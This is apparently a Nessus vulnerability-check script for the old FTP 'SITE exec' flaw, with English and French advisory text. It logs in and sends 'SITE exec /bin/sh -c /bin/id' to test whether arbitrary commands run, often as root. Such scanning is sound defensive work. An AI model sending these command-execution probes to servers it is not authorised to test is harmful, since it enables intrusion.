#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10090);
 script_bugtraq_id(2241);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-0080",
 	 	"CVE-1999-0955"  # If vulnerable to the flaw above, it's 
				 # automatically vulnerable to this one
				 # too...
		 
		 );
 name["english"] = "FTP site exec";
 name["francais"] = "FTP site exec";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It is possible to execute
arbitrary commands on the remote host using
the 'site exec' FTP problem. For instance,
issuing :
	SITE exec /bin/sh -c /bin/id
Will execute /bin/id.

Very often, these commands will be executed as root.

Solution : Upgrade your FTP server to the latest version.

Risk factor : High";


 desc["francais"] = "Il est possible d'executer
des commandes arbitraires sur la machine
distante en utilisant le problème du 'SITE
exec'. Par exemple, tapper :

	SITE exec /bin/sh -c /bin/id
Executera /bin/id.

Très souvent, ces commandes vont etre executées
avec les privilèges du root.

Solution : Mettez à jour votre serveur FTP.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to write on the remote root dir";
 summary["francais"] = "Essaye d'écrire à la racine";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include('ftp_func.inc');
port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(get_port_state(port))
{
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");


if(login)
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 if(ftp_authenticate(socket:soc, user:login,pass:password))
 {
 data = string("SITE exec /bin/sh -c /bin/id\n");
 send(socket:soc, data:data);
 reply = recv_line(socket:soc,length:1024);
 if("uid" >< reply){
        set_kb_item(name:"ftp/root_via_site_exec", value:TRUE);
        security_hole(port);
	}
 else {
        data = string("SITE exec /bin/sh -c /usr/bin/id\n");
        send(socket:soc, data:data);
        reply = recv_line(socket:soc, length:1024);
        if("uid" >< reply){
                security_hole(port);
                set_kb_item(name:"ftp/root_via_site_exec", value:TRUE);
                }
      }
 data = string("QUIT\n");
 send(socket:soc, data:data);
 }
close(soc);
}
}


